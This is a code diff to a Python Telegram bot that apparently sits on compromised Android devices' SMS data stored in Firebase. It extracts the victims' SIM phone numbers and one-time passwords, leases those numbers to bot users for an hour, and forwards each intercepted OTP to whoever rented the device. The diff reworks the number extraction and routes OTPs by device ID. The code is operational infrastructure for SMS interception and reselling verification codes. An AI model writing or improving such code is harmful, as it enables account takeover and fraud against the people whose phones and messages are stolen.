@@ -74,7 +74,6 @@ def decode_panel_url(panel_url):
 
 def extract_real_sim_numbers(dev_data, msgs):
     nums = set()
-    
     # 1. Direct Check
     for key in ["phoneNumber", "phone", "number", "mobile"]:
         if dev_data.get(key):
@@ -89,29 +88,19 @@ def extract_real_sim_numbers(dev_data, msgs):
                         n = re.sub(r'\D', '', str(sim[key]))
                         if len(n) >= 10: nums.add(n[-10:])
 
-    # 2. Telecom Sender Check
+    # 2. Strict Telecom Keyword Check
+    strict_patterns = [
+        r'(?:Jio number|Airtel number|Vi number|BSNL number|your number is|registered with mobile number|mobile number|Jio नंबर)[^\d]*([6-9]\d{9})',
+        r'(?:Jio|Airtel|Vi|BSNL)[^\d]*([6-9]\d{9})'
+    ]
+    
     for m in msgs:
         sender = str(m.get("sender", "")).lower()
+        # Only check specific carriers to avoid Jio recharge fake numbers
         if any(carrier in sender for carrier in ["jio", "airtel", "vi", "bsnl", "vodafone"]):
             body = m.get("message", "")
-            matches = re.findall(r'\b[6-9]\d{9}\b', body)
-            for match in matches: nums.add(match)
-
-    # 3. Frequency Check
-    if not nums:
-        all_text = " ".join([m.get("message", "") for m in msgs])
-        matches = re.findall(r'\b[6-9]\d{9}\b', all_text)
-        from collections import Counter
-        counts = Counter(matches)
-        for num, count in counts.items():
-            if count >= 3: nums.add(num)
-
-    # 4. Keyword Check
-    if not nums:
-        for m in msgs:
-            body = m.get("message", "")
-            if any(k in body.lower() for k in ["my number", "registered number", "sim number"]):
-                matches = re.findall(r'\b[6-9]\d{9}\b', body)
+            for pattern in strict_patterns:
+                matches = re.findall(pattern, body, re.IGNORECASE)
                 for match in matches: nums.add(match)
 
     return list(nums)
@@ -213,15 +202,14 @@ async def background_global_scanner(main_bot: Bot):
             fbs = data.get("firebases", [])
             leases = data.get("user_leases", {})
             
-            number_to_users = {}
+            # Map Device ID to Users who have leased it
+            device_to_users = {}
             current_time = time.time()
             for uid, lease in leases.items():
-                if current_time < lease["expire_at"]:
-                    for num in lease["numbers"]:
-                        clean_num = re.sub(r'\D', '', num)[-10:]
-                        number_to_users.setdefault(clean_num, []).append(uid)
+                if current_time < lease["expire_at"] and "dev_id" in lease:
+                    device_to_users.setdefault(lease["dev_id"], []).append(uid)
             
-            if not number_to_users:
+            if not device_to_users:
                 await asyncio.sleep(2) # Fast live
                 continue 
                 
@@ -239,28 +227,23 @@ async def background_global_scanner(main_bot: Bot):
                             text_content = msg.get("message", "")
                             otp = extract_otp(text_content)
                             if otp:
-                                found_nums = re.findall(r'\b[6-9]\d{9}\b', text_content)
-                                target_numbers = [re.sub(r'\D', '', n)[-10:] for n in found_nums]
-                                
-                                for num, users in number_to_users.items():
-                                    # If number is in message text OR if the user has this device ID leased (fallback for OTPs without number)
-                                    if num in target_numbers:
-                                        service = extract_service_name(text_content, msg.get("sender", ""))
-                                        for uid in users:
-                                            otp_msg = (
-                                                f"🔔 <b>OTP Received!</b>\n\n"
-                                                f"📞 <b>Number:</b> <code>+91{num}</code>\n"
-                                                f"📱 <b>Service:</b> {service}\n"
-                                                f"🔑 <b>OTP:</b> {otp}\n\n"
-                                                f"💬 <b>Msg:</b> {text_content[:100]}..."
-                                            )
-                                            kb = InlineKeyboardMarkup(inline_keyboard=[
-                                                [InlineKeyboardButton(text=f"📋 {otp}", copy_text=CopyTextButton(text=otp))]
-                                            ])
-                                            try:
-                                                await main_bot.send_message(uid, otp_msg, reply_markup=kb, parse_mode="HTML")
-                                                otps_sent += 1
-                                            except Exception: pass
+                                # FAST LIVE: Send to any user who has this device ID leased
+                                if dev_id in device_to_users:
+                                    service = extract_service_name(text_content, msg.get("sender", ""))
+                                    for uid in device_to_users[dev_id]:
+                                        otp_msg = (
+                                            f"🔔 <b>OTP Received!</b>\n\n"
+                                            f"📱 <b>Service:</b> {service}\n"
+                                            f"🔑 <b>OTP:</b> {otp}\n\n"
+                                            f"💬 <b>Msg:</b> {text_content[:100]}..."
+                                        )
+                                        kb = InlineKeyboardMarkup(inline_keyboard=[
+                                            [InlineKeyboardButton(text=f"📋 {otp}", copy_text=CopyTextButton(text=otp))]
+                                        ])
+                                        try:
+                                            await main_bot.send_message(uid, otp_msg, reply_markup=kb, parse_mode="HTML")
+                                            otps_sent += 1
+                                        except Exception: pass
             if otps_sent > 0:
                 d = load_data()
                 d.setdefault("stats", {})["total_otps"] = d.get("stats", {}).get("total_otps", 0) + otps_sent
@@ -468,7 +451,12 @@ async def user_country_selected(cq: CallbackQuery):
     )
     
     data = load_data()
-    data["user_leases"][str(uid)] = {"numbers": numbers, "country": country, "expire_at": int(time.time()) + 3600}
+    data["user_leases"][str(uid)] = {
+        "numbers": numbers, 
+        "country": country, 
+        "dev_id": dev_id, # Rent code saved for OTP routing
+        "expire_at": int(time.time()) + 3600
+    }
     data["user_history"].setdefault(str(uid), {})
     for n in numbers: data["user_history"][str(uid)][n] = int(time.time())
     save_data(data)
